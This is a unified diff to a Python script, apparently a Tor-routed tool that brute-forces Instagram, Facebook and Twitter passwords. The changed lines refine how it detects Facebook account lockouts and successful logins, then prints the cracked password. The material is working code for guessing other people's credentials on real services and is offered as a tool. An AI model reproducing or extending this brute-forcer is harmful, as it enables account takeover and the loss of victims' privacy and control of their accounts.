@@ -1,10 +1,9 @@
-# Date: 08/06/2017
+# Date: 08/09/2017
 # Distro: Kali Linux
 # Author: Ethical-H4CK3R
-# Description: Bruteforce Facebook,Instagram & Twitter 
+# Description: Bruteforce Instagram, Facebook and Twitter
 #
 #
-
 import os
 import time
 import argparse
@@ -133,11 +132,21 @@ class Bruter(TorManager,Browser):
  def attempt(self,pwd):
   with self.lock:
    self.tries+=1
+
    self.createBrowser()
    html = self.login(pwd)
 
    if html:
-    self.locked = True if 'try again later' in html else self.locked # facebook
+    self.locked = True if '/help/contact/' in html else self.locked # facebook only
+    if self.locked:
+     self.display(pwd)
+     self.kill('{} is {}locked{}, please try again later.'.\
+     format(self.username,self.r,self.n))
+
+    if any(['save-device' in html,'home.php' in html]): # facebook only
+     self.isFound = True
+     self.kill(pwd)
+
     if all([not self.form1 in html,not self.form2 in html]):
      self.isFound = True
      self.kill(pwd)
@@ -169,7 +178,6 @@ class Bruter(TorManager,Browser):
   attempts = self.tries if self.tries else ''
 
   subprocess.call(['clear'])
-  if not ip:time.sleep(.2)
   print '\n  {}[-] Web-Site: {}{}'.format(self.n,self.b,self.siteName)
   print '  {}[-] Proxy Ip: {}{}'.format(self.n,self.b,ip)
   print '  {}[-] Wordlist: {}{}'.format(self.n,self.b,self.wordlist)
@@ -209,7 +217,7 @@ def main():
  try:
   engine.run()
  finally:
-  if not engine.isFound:
+  if all([not engine.isFound,not engine.locked]):
    engine.kill('Exiting {}...{}'.format(engine.g,engine.n))
 
 if __name__ == '__main__':
